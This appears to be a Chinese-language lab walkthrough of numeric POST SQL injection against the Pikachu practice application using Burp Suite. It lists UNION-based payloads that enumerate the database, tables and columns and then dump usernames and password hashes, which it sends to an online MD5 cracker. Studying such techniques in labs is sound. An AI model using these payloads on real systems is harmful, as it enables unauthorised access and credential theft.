# 数字型注入（post）

　　随便选查询一个，并bp抓包 发送到repeater中

　　在id=1加'

![image](assets/image-20251112204247-hk6iw4t.png)

　　id=1'--+继续报错 说明是数字型注入

　　查看列数：

　　id=**1 order by 3--+**  报错 说明只有两列

![image](assets/image-20251112204712-c331kcf.png)

　　查看显错位：

　　id=**1 union select 1，2--+**

![image](assets/image-20251112205059-mv4ptry.png)

　　查库名和版本：

　　**id=1 union select database(),version()**

![image](assets/image-20251112205807-0uutwxs.png)

　　查询所有表，这里使用mysql5.0以上版本自带的information_schema表

　　id=1 union select group_concat(table_name),2 from information_schema.tables where table_schema='pikachu'

![image](assets/image-20251112210137-nrp3mbr.png)

　　查询敏感表users表中所有列

　　id=1 union select group_concat(column_name),2 from information_schema.columns where table_schema='pikachu' and table_name='users'

![image](assets/image-20251112210256-hjsibcl.png)

　　查询用户名和密码：

　　id=1 union select group_concat(username),group_concat(password) from users

![image](assets/image-20251112210457-1g1dyd1.png)

　　拿密码去MD5在线解密解密
